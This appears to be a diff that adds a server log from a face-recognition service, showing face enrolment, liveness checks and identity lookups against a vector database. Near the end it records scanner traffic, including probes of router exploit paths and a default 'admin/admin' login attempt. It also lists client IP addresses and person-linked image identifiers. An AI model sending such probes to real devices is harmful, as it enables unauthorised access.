+/media/ai-r-d/DATA1/Face_triton/service/face_service_H.py:245: DeprecationWarning: `np.int` is a deprecated alias for the builtin `int`. To silence this warning, use `int` by itself. Doing this will not modify any behavior and is safe. When replacing `np.int`, you may wish to use e.g. `np.int64` or `np.int32` to specify the precision. If you wish to review your current use, check the release note link for additional information.
+Deprecated in NumPy 1.20; for more details and guidance: https://numpy.org/devdocs/release/1.20.0-notes.html#deprecations
+  x1,y1,x2,y2,score = bbox.astype(np.int)
+2022-11-15 08:25:59.799 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
+2022-11-15 08:26:02.825 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
+2022-11-15 08:26:02.826 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
+2022-11-15 08:26:02.836 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
+2022-11-15 08:26:05.166 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
+2022-11-15 08:26:08.189 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
+2022-11-15 08:26:08.189 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
+2022-11-15 08:26:08.192 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
+2022-11-15 08:26:08.192 | INFO     | __main__:insert:264 - Masked id [437359909826987289], Non mask id [437359909826987275]
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+save done:  static/74cb928c648411ed9b774ba7bb94539d_62846810f6f4201104b3af81.jpg
+[[0.99794376]]
+path image static/74cb928c648411ed9b774ba7bb94539d_62846810f6f4201104b3af81.jpg
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+Total:  10.812917709350586
+INFO:     123.24.206.26:55891 - "POST /insert HTTP/1.1" 200 OK
+2022-11-15 08:26:11.603 | ERROR    | __main__:insert:277 - Fake face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+no rotate
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+save done:  static/7bdc28a2648411ed9b774ba7bb94539d_626a1cdb15e49f66d33d5cb5.jpg
+Total:  2.346822500228882
+INFO:     123.24.206.26:35761 - "POST /insert HTTP/1.1" 200 OK
+INFO:     123.24.206.26:49447 - "POST /insert HTTP/1.1" 422 Unprocessable Entity
+2022-11-15 08:26:30.395 | ERROR    | __main__:insert:239 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+no rotate
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+save done:  static/870abc70648411ed9b774ba7bb94539d_626a1cdb15e49f66d33d5cb5.jpg
+Total:  2.370487928390503
+INFO:     123.24.206.26:48694 - "POST /insert HTTP/1.1" 200 OK
+INFO:     123.24.206.26:64661 - "POST /insert HTTP/1.1" 422 Unprocessable Entity
+2022-11-15 08:26:47.531 | ERROR    | __main__:insert:195 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Total:  0.21230435371398926
+INFO:     123.24.206.26:50652 - "POST /insert HTTP/1.1" 200 OK
+2022-11-15 08:28:00.039 | ERROR    | __main__:insert:195 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Total:  0.25301241874694824
+INFO:     123.24.206.26:57838 - "POST /insert HTTP/1.1" 200 OK
+2022-11-15 08:28:24.727 | ERROR    | __main__:insert:195 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Total:  0.20421981811523438
+INFO:     123.24.206.26:52340 - "POST /insert HTTP/1.1" 200 OK
+2022-11-15 08:28:37.405 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 104.55229187011719, id: 437359909826987275)']"]
+2022-11-15 08:28:37.406 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[191.98917    73.571945  487.34143   382.6996      0.8441075]]
+('62846810f6f4201104b3af81', 'static/74cb928c648411ed9b774ba7bb94539d_62846810f6f4201104b3af81.jpg')
+path:  ['static/74cb928c648411ed9b774ba7bb94539d_62846810f6f4201104b3af81.jpg']
+pr>>>>>>>>>>> ['437359909826987275']
+time:  0.19575262069702148
+INFO:     123.24.206.26:57220 - "POST /recognize HTTP/1.1" 200 OK
+INFO:     123.24.206.26:65468 - "GET /docs HTTP/1.1" 200 OK
+INFO:     123.24.206.26:65468 - "GET /openapi.json HTTP/1.1" 200 OK
+2022-11-15 08:30:12.159 | ERROR    | __main__:insert:195 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Total:  0.20613312721252441
+INFO:     123.24.206.26:36420 - "POST /insert HTTP/1.1" 200 OK
+2022-11-15 08:30:38.794 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
+2022-11-15 08:30:41.819 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
+2022-11-15 08:30:41.819 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
+2022-11-15 08:30:41.825 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
+2022-11-15 08:30:44.091 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
+2022-11-15 08:30:47.127 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
+2022-11-15 08:30:47.127 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
+2022-11-15 08:30:47.137 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
+2022-11-15 08:30:47.137 | INFO     | __main__:insert:264 - Masked id [437359909826987328], Non mask id [437359909826987314]
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+save done:  static/1b0a2cc6648511ed9b774ba7bb94539d_626a1cdb15e49f66d33d5cb5.jpg
+[[0.9999893]]
+path image static/1b0a2cc6648511ed9b774ba7bb94539d_626a1cdb15e49f66d33d5cb5.jpg
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+Total:  10.81199312210083
+INFO:     123.24.206.26:60046 - "POST /insert HTTP/1.1" 200 OK
+2022-11-15 08:31:21.722 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 200.0559539794922, id: 437359909826987314)']"]
+2022-11-15 08:31:21.723 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[160.0074    124.80617   421.81174   390.95807     0.8959907]]
+('626a1cdb15e49f66d33d5cb5', 'static/1b0a2cc6648511ed9b774ba7bb94539d_626a1cdb15e49f66d33d5cb5.jpg')
+path:  ['static/1b0a2cc6648511ed9b774ba7bb94539d_626a1cdb15e49f66d33d5cb5.jpg']
+pr>>>>>>>>>>> ['437359909826987314']
+time:  0.22258400917053223
+INFO:     123.24.206.26:57574 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:32:36.807 | ERROR    | __main__:search:301 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+INFO:     123.24.206.26:53077 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:36:54.601 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 338.6363830566406, id: 437359909826986470)']"]
+2022-11-15 08:36:54.602 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[ 98.25757     92.11986    515.47363    574.08813      0.64578635]]
+('630055198e6de33f5822c556', 'static/1489fce4616211ed84aaad0224ec19ed_630055198e6de33f5822c556.jpg')
+path:  ['static/1489fce4616211ed84aaad0224ec19ed_630055198e6de33f5822c556.jpg']
+pr>>>>>>>>>>> ['437359909826986470']
+time:  0.21732068061828613
+INFO:     123.24.206.26:36392 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:40:46.170 | DEBUG    | module.mysql_helpers:show_image:92 - Mysql search by image: ['630053a08e6de33f58228691']
+INFO:     123.24.206.26:43490 - "POST /showimage HTTP/1.1" 200 OK
+INFO:     123.24.206.26:58341 - "GET /4d55a5045ea711ed8a8bb108c0801c44_630053a08e6de33f58228691.jpg HTTP/1.1" 200 OK
+2022-11-15 08:41:15.288 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 232.55899047851562, id: 437359909826986162)']"]
+2022-11-15 08:41:15.288 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[118.00853   223.26706   417.96667   539.9634      0.8629893]]
+('630053a08e6de33f58228691', 'static/b87612f45f0311ed8a8bb108c0801c44_630053a08e6de33f58228691.jpg')
+path:  ['static/b87612f45f0311ed8a8bb108c0801c44_630053a08e6de33f58228691.jpg']
+pr>>>>>>>>>>> ['437359909826986162']
+time:  0.23344159126281738
+INFO:     123.24.206.26:45572 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:42:22.835 | ERROR    | __main__:search:301 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+INFO:     123.24.206.26:38147 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:42:32.687 | ERROR    | __main__:search:301 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+INFO:     123.24.206.26:54578 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:42:50.266 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 349.0365905761719, id: 437359909826986323)']"]
+2022-11-15 08:42:50.266 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[209.8336    192.93712   496.8837    462.78488     0.8149439]]
+('635ba6564c531e0d12fa011d', 'static/0c1f4b125fce11ed8b7b25a1c5ccbc9d_635ba6564c531e0d12fa011d_masked.jpg')
+path:  ['static/0c1f4b125fce11ed8b7b25a1c5ccbc9d_635ba6564c531e0d12fa011d_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986323']
+time:  0.22709965705871582
+INFO:     123.24.206.26:40774 - "POST /recognize HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     193.153.243.61:51742 - "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 Not Found
+2022-11-15 08:46:56.947 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 400.3594665527344, id: 437359909826986190)']"]
+2022-11-15 08:46:56.947 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[158.78787    93.40912   478.93433   341.47556     0.6505373]]
+('620c73d783e52b7537acea2c', 'static/2c7d15085f1d11ed8a8bb108c0801c44_620c73d783e52b7537acea2c.jpg')
+path:  ['static/2c7d15085f1d11ed8a8bb108c0801c44_620c73d783e52b7537acea2c.jpg']
+pr>>>>>>>>>>> ['437359909826986190']
+time:  0.15766072273254395
+INFO:     123.24.206.26:42463 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:47:08.886 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 291.58135986328125, id: 437359909826986190)']"]
+2022-11-15 08:47:08.886 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[188.73563   173.0084    434.00345   333.2647      0.6036476]]
+('620c73d783e52b7537acea2c', 'static/2c7d15085f1d11ed8a8bb108c0801c44_620c73d783e52b7537acea2c.jpg')
+path:  ['static/2c7d15085f1d11ed8a8bb108c0801c44_620c73d783e52b7537acea2c.jpg']
+pr>>>>>>>>>>> ['437359909826986190']
+time:  0.1259138584136963
+INFO:     123.24.206.26:52891 - "POST /recognize HTTP/1.1" 200 OK
+INFO:     205.210.31.156:60356 - "GET / HTTP/1.1" 404 Not Found
+2022-11-15 09:13:46.979 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 193.56057739257812, id: 437359909826986456)']"]
+2022-11-15 09:13:46.980 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[112.10695   209.11902   472.41      557.04706     0.7622506]]
+('6300582d8e6de33f58262b0a', 'static/998d97ea615b11ed84aaad0224ec19ed_6300582d8e6de33f58262b0a.jpg')
+path:  ['static/998d97ea615b11ed84aaad0224ec19ed_6300582d8e6de33f58262b0a.jpg']
+pr>>>>>>>>>>> ['437359909826986456']
+time:  0.21024274826049805
+INFO:     123.24.206.26:58716 - "POST /recognize HTTP/1.1" 200 OK
+INFO:     154.26.133.74:65219 - "GET / HTTP/1.1" 404 Not Found
+INFO:     122.194.11.106:33034 - "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 Not Found
+INFO:     92.118.39.78:39212 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.162:61962 - "GET / HTTP/1.1" 404 Not Found
+INFO:     45.142.192.7:34806 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.248.133.44:35508 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.248.133.44:58048 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     45.142.192.5:45624 - "GET / HTTP/1.1" 404 Not Found
+INFO:     138.68.94.5:20079 - "GET / HTTP/1.1" 404 Not Found
+INFO:     45.142.192.6:48784 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     198.235.24.155:64134 - "GET / HTTP/1.1" 404 Not Found
+INFO:     193.118.53.194:49568 - "GET / HTTP/1.1" 404 Not Found
+INFO:     92.253.218.15:47248 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.155:65038 - "GET / HTTP/1.1" 404 Not Found
+INFO:     103.89.62.86:56214 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:54941 - "GET /1668497883 HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:36201 - "POST /sdk HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:37366 - "GET /HNAP1 HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:45872 - "GET /evox/about HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:52873 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:41840 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:60029 - "GET / HTTP/1.1" 404 Not Found
+INFO:     45.142.192.7:45346 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Unsupported upgrade request.
+INFO:     123.24.206.26:52607 - "POST /showimage HTTP/1.1" 422 Unprocessable Entity
+INFO:     123.24.206.26:65053 - "POST /showimage HTTP/1.1" 422 Unprocessable Entity
+INFO:     45.142.192.6:40842 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Unsupported upgrade request.
+INFO:     216.218.206.111:52245 - "GET / HTTP/1.1" 404 Not Found
+INFO:     92.118.39.78:44024 - "GET / HTTP/1.1" 404 Not Found
